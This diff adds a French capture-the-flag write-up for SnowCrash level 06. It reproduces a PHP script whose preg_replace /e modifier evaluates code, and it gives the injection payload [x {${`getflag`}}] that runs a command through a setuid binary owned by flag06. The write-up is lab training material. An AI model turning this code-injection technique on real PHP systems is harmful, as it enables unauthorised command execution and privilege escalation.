@@ -1,0 +1,76 @@
+Level 06
+
+Cette fois nous avons deux executables accessibles :
+
+- un script .php
+- un programme qui lance ce script
+
+Le script level06.php :
+#!/usr/bin/php
+
+<?php
+function y($m) {
+    $m = preg_replace("/\./", " x ", $m);
+    $m = preg_replace("/@/", " y", $m);
+    return $m;
+}
+
+function x($y, $z) {
+    $a = file_get_contents($y);
+    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+    $a = preg_replace("/\[/", "(", $a);
+    $a = preg_replace("/\]/", ")", $a);
+    return $a;
+}
+
+$r = x($argv[1], $argv[2]);
+print $r;
+?>
+
+Ce script lit le contenu d'un fichier, effectue des
+remplacements en fonction des motifs spécifiés et affiche
+le résultat final. La partie critique est l'utilisation
+du modificateur /e dans preg_replace, qui permet
+d'évaluer du code PHP dans la chaîne de remplacement,
+créant ainsi une vulnérabilité potentiellement
+exploitable.
+
+Nous devons donc creer un fichier, et nous savons grace
+au level precedent que nous pouvons le faire dans /dev/shm/
+
+ce fichier devra simplement avoir un code que le programme
+interpretera comme la commande getflag apres modification.
+
+Nous creons donc le fichier /dev/shm/input.txt avec une seule ligne :
+[x {${`getflag`}}]
+
+et nous lancons le programme :
+./level06.php /dev/shm/input.txt
+La reponse a cette commande est que nous n'avons pas les droits du flag06.
+
+Nous modifions donc le lancement :
+./level06 /dev/shm/input.txt
+
+En effet de la meme facon que pour le level precedent, un ls -la nous indique que, sur level06, il y a des Acces
+Control List sur ce fichier et un getfacl dessus nous précise qu'il a des droits pour flag06.
+
+level06@SnowCrash:~$ getfacl level06
+
+# file: level06
+
+# owner: flag06
+
+# group: level06
+
+# flags: s--
+
+user::rwx
+group::---
+group:level06:r-x
+mask::r-x
+other::---
+
+La présence d'un setuid (indiqué par s dans les flags) sur le fichier level06 est particulièrement intéressante. Cela signifie que lorsque le fichier est exécuté, il s'exécute avec les privilèges de l'utilisateur propriétaire (flag06), et non avec les privilèges de l'utilisateur qui l'a lancé.
+
+Avec cette dernière commande, nous obtenons le token pour
+le level07
